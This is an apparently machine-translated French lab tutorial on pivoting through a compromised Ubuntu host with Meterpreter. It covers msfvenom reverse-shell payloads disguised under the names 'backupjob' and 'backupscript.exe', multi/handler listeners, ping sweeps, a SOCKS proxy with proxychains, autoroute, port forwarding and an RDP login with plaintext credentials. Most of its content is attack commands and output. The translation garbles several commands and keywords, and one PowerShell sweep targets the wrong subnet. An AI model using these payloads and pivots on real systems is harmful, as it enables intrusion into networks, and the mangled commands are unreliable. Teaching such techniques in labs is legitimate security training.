Tunnellisation Meterpreter et redirection de port
=======================================

* * * * *

Considérons maintenant un scénario où nous avons notre accès au shell Meterpreter sur le serveur Ubuntu (l'hôte pivot), et nous voulons effectuer des analyses d'énumération via l'hôte pivot, mais nous aimerions profiter des commodités que les sessions Meterpreter nous apportent . Dans de tels cas, nous pouvons toujours créer un pivot avec notre session Meterpreter sans compter sur la redirection de port SSH. Nous pouvons créer un shell Meterpreter pour le serveur Ubuntu avec la commande ci-dessous, qui renverra un shell sur notre hôte d'attaque sur le port `8080`.

#### Création de la charge utile pour l'hôte Ubuntu Pivot

Création de la charge utile pour l'hôte Ubuntu Pivot

```
dsgsec@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Linux à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 130 octets
Taille finale du fichier elf : 250 octets
Enregistré sous : tâche de sauvegarde

```

Avant de copier la charge utile, nous pouvons démarrer un [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/), également appelé gestionnaire de charge utile générique.

#### Configuration et démarrage du multi/handler

Configurer et démarrer le multi/handler

```
msf6 > utiliser exploit/multi/gestionnaire

[*] Utilisation de la charge utile configurée generic/shell_reverse_tcp
exploit msf6 (multi/gestionnaire)> définir lhost 0.0.0.0
lhost => 0.0.0.0
exploit msf6 (multi/gestionnaire)> définir lport 8080
lport => 8080
exploit msf6 (multi/handler)> définir la charge utile linux/x64/meterpreter/reverse_tcp
charge utile => linux/x64/meterpreter/reverse_tcp
exploit msf6 (multi/gestionnaire)> exécuter
[*] Démarrage du gestionnaire TCP inversé sur 0.0.0.0:8080

```

Nous pouvons copier le fichier binaire `backupjob` sur l'hôte pivot Ubuntu `over SSH` et l'exécuter pour obtenir une session Meterpreter.

#### Exécution de la charge utile sur l'hôte pivot

Exécution de la charge utile sur l'hôte pivot

```
ubuntu@WebServer :~$ ls

tâche de sauvegarde
ubuntu@WebServer :~$ chmod +x tâche de sauvegarde
ubuntu@WebServer :~$ ./tâche de sauvegarde

```

Nous devons nous assurer que la session Meterpreter est établie avec succès lors de l'exécution de la charge utile.

#### Création d'une session Meterpreter

Création de session Meterpreter

```
[*] Étape d'envoi (3020772 octets) à 10.129.202.64
[*] Meterpreter session 1 ouverte (10.10.14.18:8080 -> 10.129.202.64:39826 ) au 2022-03-03 12:27:43 -0500
meterpreter > pwd

/accueil/ubuntu

```

Nous savons que la cible Windows se trouve sur le réseau 172.16.5.0/23. Donc, en supposant que le pare-feu sur la cible Windows autorise les requêtes ICMP, nous voudrions effectuer un balayage ping sur ce réseau. Nous pouvons le faire en utilisant Meterpreter avec le module `ping_sweep` , qui générera le trafic ICMP de l'hôte Ubuntu vers le réseau `172.16.5.0/23`.

#### Balayage ping

Balayage de ping

```
meterpreter > exécuter post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Effectuer un balayage ping pour la plage IP 172.16.5.0/23

```

Nous pourrions également effectuer un balayage ping à l'aide d'une `boucle for` directement sur un hôte pivot cible qui enverra un ping à n'importe quel appareil dans la plage de réseau que nous spécifions. Voici deux balayages ping utiles pour les lignes simples que nous pourrions utiliser pour les hôtes pivot basés sur Linux et Windows.

#### Ping Sweep For Loop sur les hôtes Linux Pivot

Ping Sweep For Loop sur les hôtes Linux Pivot

```
for i in {1..254} ;faire (ping -c 1 172.16.5.$i | grep "octets de" &) ;fait

```

#### Balayage ping pour la boucle à l'aide de CMD

Balayage ping pour la boucle à l'aide de CMD

```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | trouver "Répondre"

```

#### Ping Sweep à l'aide de PowerShell

Balayage ping à l'aide de PowerShell

```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```

Remarque : Il est possible qu'un balayage ping n'aboutisse pas à des réponses réussies lors de la première tentative, en particulier lors de la communication sur les réseaux. Cela peut être dû au temps qu'il faut à un hôte pour créer son cache arp. Dans ces cas, il est bon de tenter notre balayage ping au moins deux fois pour s'assurer que le cache arp est construit.

Il peut y avoir des scénarios où le pare-feu d'un hôte bloque le ping (ICMP), et le ping ne nous donnera pas de réponses réussies. Dans ces cas, nous pouvons effectuer une analyse TCP sur le réseau 172.16.5.0/23 avec Nmap. Au lieu d'utiliser SSH pour la redirection de port, nous pouvons également utiliser le module de routage post-exploitation de Metasploit `socks_proxy` pour configurer un proxy local sur notre hôte d'attaque. Nous allons configurer le proxy SOCKS pour `SOCKS version 4a`. Cette configuration SOCKS démarrera un écouteur sur le port `9050` et acheminera tout le trafic reçu via notre session Meterpreter.

#### Configuration du proxy SOCKS de MSF

Configuration du proxy SOCKS de MSF

```
msf6 > utiliser auxiliaire/serveur/socks_proxy

msf6 auxiliaire (serveur/socks_proxy) > définir SRVPORT 9050
SRVPORT => 9050
msf6 auxiliaire (serveur/socks_proxy) > définir SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliaire (serveur/socks_proxy) > définir la version 4a
version => 4a
msf6 auxiliaire (serveur/socks_proxy) > exécuter
[*] Module auxiliaireexécuté en tant que travail d'arrière-plan 0.

[*] Démarrage du serveur proxy SOCKS
msf6 auxiliaire (serveur/socks_proxy) > options

Options du module (auxiliaire/serveur/socks_proxy) :

    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    SRVHOST 0.0.0.0 oui L'adresse à écouter
    SRVPORT 9050 oui Le port sur lequel écouter
    VERSION 4a oui La version SOCKS à utiliser (Accepté : 4a,
                                         5)

Action auxiliaire :

    Nom Descriptif
    ---- -----------
    Proxy Exécuter un serveur proxy SOCKS

```

#### Confirmation que le serveur proxy est en cours d'exécution

Confirmation que le serveur proxy est en cours d'exécution

```
msf6 auxiliaire (serveur/socks_proxy) > travaux

Emplois
====

   Id Nom Payload Payload opts
   -- ---- ------- ------------
   0 Auxiliaire : serveur/socks_proxy

```

Après avoir lancé le serveur SOCKS, nous allons configurer des chaînes proxy pour acheminer le trafic généré par d'autres outils comme Nmap via notre pivot sur l'hôte Ubuntu compromis. Nous pouvons ajouter la ligne ci-dessous à la fin de notre fichier `proxychains.conf` situé dans `/etc/proxychains.conf` si elle ne s'y trouve pas déjà.

#### Ajout d'une ligne à proxychains.conf si nécessaire

Ajouter une ligne à proxychains.conf si nécessaire

```
chaussettes4 127.0.0.1 9050

```

Remarque : selon la version du serveur SOCKS, nous pouvons parfois avoir besoin de remplacer socks4 par socks5 dans proxychains.conf.

Enfin, nous devons dire à notre module socks_proxy de router tout le trafic via notre session Meterpreter. Nous pouvons utiliser le module `post/multi/manage/autoroute` de Metasploit pour ajouter des routes pour le sous-réseau 172.16.5.0, puis acheminer tout le trafic de nos chaînes proxy.

#### Création d'itinéraires avec AutoRoute

Création d'itinéraires avec AutoRoute

```
msf6 > utiliser post/multi/gérer/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SÉANCE => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SOUS-RÉSEAU => 172.16.5.0
msf6 post(multi/gérer/autoroute) > exécuter

[!] SESSION peut ne pas être compatible avec ce module :
[!] * plate-forme de session incompatible : linux
[*] Module en cours d'exécution contre 10.129.202.64
[*] Recherche de sous-réseaux à autorouter.
[+] Route ajoutée au sous-réseau 10.129.0.0/255.255.0.0 à partir de la table de routage de l'hôte.
[+] Route ajoutée au sous-réseau 172.16.5.0/255.255.254.0 à partir de la table de routage de l'hôte.
[*] Exécution du post-module terminée

```

Il est également possible d'ajouter des routes avec autoroute en exécutant autoroute depuis la session Meterpreter.

Création d'itinéraires avec AutoRoute

```
meterpreter > run autoroute -s 172.16.5.0/23

[!] Les scripts Meterpreter sont obsolètes. Essayez post/multi/gérer/autoroute.
[!] Exemple : lancez post/multi/manage/autoroute OPTION=valeur [...]
[*] Ajout d'une route à 172.16.5.0/255.255.254.0...
[+] Route ajoutée à 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Utilisez l'option -p pour lister toutes les routes actives

```

Après avoir ajouté la ou les routes nécessaires, nous pouvons utiliser l'option `-p` pour répertorier les routes actives afin de nous assurer que notre configuration est appliquée comme prévu.

#### Liste des routes actives avec AutoRoute

Liste des routes actives avec AutoRoute

```
meterpreter > exécuter autoroute -p

[!] Les scripts Meterpreter sont obsolètes. Essayez post/multi/gérer/autoroute.
[!] Exemple : lancez post/multi/manage/autoroute OPTION=valeur [...]

Table de routage active
====================

    Passerelle de masque de réseau de sous-réseau
    ------ ------- -------
    10.129.0.0 255.255.0.0 Séance 1
    172.16.4.0 255.255.254.0 Séance 1
    172.16.5.0 255.255.254.0 Séance 1

```

Comme vous pouvez le voir sur la sortie ci-dessus, la route a été ajoutée au réseau 172.16.5.0/23. Nous pourrons désormais utiliser des proxychains pour acheminer notre trafic Nmap via notre session Meterpreter.

#### Test des fonctionnalités de proxy et de routage

Test des fonctionnalités de proxy et de routage

```
dsgsec@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Découverte d'hôte désactivée (-Pn). Toutes les adresses seront marquées "up" et les temps de balayage peuvent être plus lents.
À partir de Nmap 7.92 ( https://nmap.org ) au 2022-03-03 13:40 EST
Lancement de la résolution DNS parallèle d'un hôte. à 13h40
Résolution DNS parallèle terminée de 1 hôte. à 13h40, 0.12s écoulé
Lancement de Connect Scan à 13:40
Balayage 172.16.5.19 [1 port]
|Chaîne en S|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Découverte du port ouvert 3389/tcp sur 172.16.5.19
Scan de connexion terminé à 13h40, 0,12 s écoulé (1 port au total)
Rapport d'analyse Nmap pour 172.16.5.19
L'hôte est actif (latence de 0,12 s).

SERVICE DE L'ÉTAT DU PORT
3389/tcp ouvrir le serveur ms-wbt

Lire les fichiers de données depuis : /usr/bin/../share/nmap
Nmap done : 1 adresse IP (1 hôte actif) scannée en 0,45 seconde

```

* * * * *

Redirection de port
---------------

La redirection de port peut également être effectuée à l'aide du module `portfwd` de Meterpreter. Nous pouvons activer un écouteur sur notre hôte d'attaque et demander à Meterpreter de transférer tous les paquets reçus sur ce port via notre session Meterpreter vers un hôte distantsur le réseau 172.16.5.0/23.

#### Options Portfwd

Options de transfert

```
meterpreter > aide portfwd

Utilisation : portfwd [-h] [ajouter | supprimer | liste | flush] [arguments]

OPTIONS :

     -h Bannière d'aide.
     -i <opt> Index de l'entrée de redirection de port avec laquelle interagir (voir la commande "list").
     -l <opt> Forward : port local à écouter. Inverse : port local auquel se connecter.
     -L <opt> Forward : hôte local sur lequel écouter (optionnel). Inverse : hôte local auquel se connecter.
     -p <opt> Forward : port distant auquel se connecter. Reverse : port distant sur lequel écouter.
     -r <opt> Forward : hôte distant auquel se connecter.
     -R Indique une redirection de port inverse.

```

#### Création d'un relais TCP local

Création d'un relais TCP local

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Relais TCP local créé : :3300 <-> 172.16.5.19:3389

```

La commande ci-dessus demande à la session Meterpreter de démarrer un écouteur sur le port local de notre hôte d'attaque (`-l`) `3300` et de transférer tous les paquets vers le serveur Windows distant (`-r`) `172.16.5.19` sur `3389 ` port (`-p`) via notre session Meterpreter. Maintenant, si nous exécutons xfreerdp sur notre localhost:3300, nous pourrons créer une session de bureau à distance.

#### Connexion à Windows Target via localhost

Connexion à Windows Target via localhost

```
dsgsec@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123

```

#### Sortie Netstat

Nous pouvons utiliser Netstat pour afficher des informations sur la session que nous avons récemment établie. D'un point de vue défensif, nous pouvons bénéficier de l'utilisation de Netstat si nous soupçonnons qu'un hôte a été compromis. Cela nous permet de voir toutes les sessions qu'un hôte a établies.

Sortie Netstat

```
dsgsec@htb[/htb]$ netstat -antp

tcp 0 0 127.0.0.1:54652 127.0.0.1:3300 ÉTABLI 4075/xfreerdp

```

* * * * *

Redirection de port inversée Meterpreter
-----------------------------------

Semblable à la redirection de port local, Metasploit peut également effectuer une `redirection de port inverse` avec la commande ci-dessous, où vous voudrez peut-être écouter sur un port spécifique sur le serveur compromis et transférer tous les shells entrants du serveur Ubuntu vers notre hôte d'attaque. Nous allons démarrer un écouteur sur un nouveau port sur notre hôte d'attaque pour Windows et demander au serveur Ubuntu de transmettre toutes les requêtes reçues au serveur Ubuntu sur le port `1234` à notre écouteur sur le port `8081`.

Nous pouvons créer une redirection de port inversée sur notre shell existant à partir du scénario précédent à l'aide de la commande ci-dessous. Cette commande transfère toutes les connexions sur le port `1234` s'exécutant sur le serveur Ubuntu à notre hôte d'attaque sur le port local (`-l`) `8081`. Nous allons également configurer notre écouteur pour écouter sur le port 8081 pour un shell Windows.

#### Règles de transfert de port inversé

Règles de transfert de port inversé

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Relais TCP local créé : 10.10.14.18:8081 <-> :1234

```

#### Configuration et démarrage de multi/handler

Configurer et démarrer le multi/gestionnaire

```
meterpreter > bg

[*] Séance d'information 1...
msf6 exploit(multi/handler) > définir la charge utile windows/x64/meterpreter/reverse_tcp
charge utile => windows/x64/meterpreter/reverse_tcp
exploit msf6 (multi/gestionnaire)> définir LPORT 8081
LPORT => 8081
exploit msf6 (multi/gestionnaire)> définir LHOST 0.0.0.0
LHÔTE => 0.0.0.0
exploit msf6 (multi/gestionnaire)> exécuter

[*] Démarrage du gestionnaire TCP inversé sur 0.0.0.0:8081

```

Nous pouvons maintenant créer une charge utile reverse shell qui renverra une connexion à notre serveur Ubuntu sur `172.16.5.129`:`1234` lorsqu'il sera exécuté sur notre hôte Windows. Une fois que notre serveur Ubuntu reçoit cette connexion, il la transmet à `l'adresse IP de l'hôte d'attaque` : `8081` que nous avons configurée.

#### Génération de la charge utile Windows

Génération de la charge utile Windows

```
dsgsec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 510 octets
Taille finale du fichier exe : 7168 octets
Enregistré sous : backupscript.exe

```

Enfin, si nous exécutons notre charge utile sur l'hôte Windows, nous devrions pouvoir recevoir un shell de Windows pivoté via le serveur Ubuntu.

#### Établir la session Meterpreter

Établir la session Meterpreter

```
[*] Démarrage du gestionnaire TCP inversé sur 0.0.0.0:8081
[*] Envoi de l'étape (200262 octets) au 10.10.14.18
[*] Meterpreter session 2 ouverte (10.10.14.18:8081 -> 10.10.14.18:40173 ) au 2022-03-04 15:26:14 -0500

compteur> shell
Processus 2336 créé.
Canal 1 créé.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. Tous les droits sont réservés.

C:\>

```

* * * * *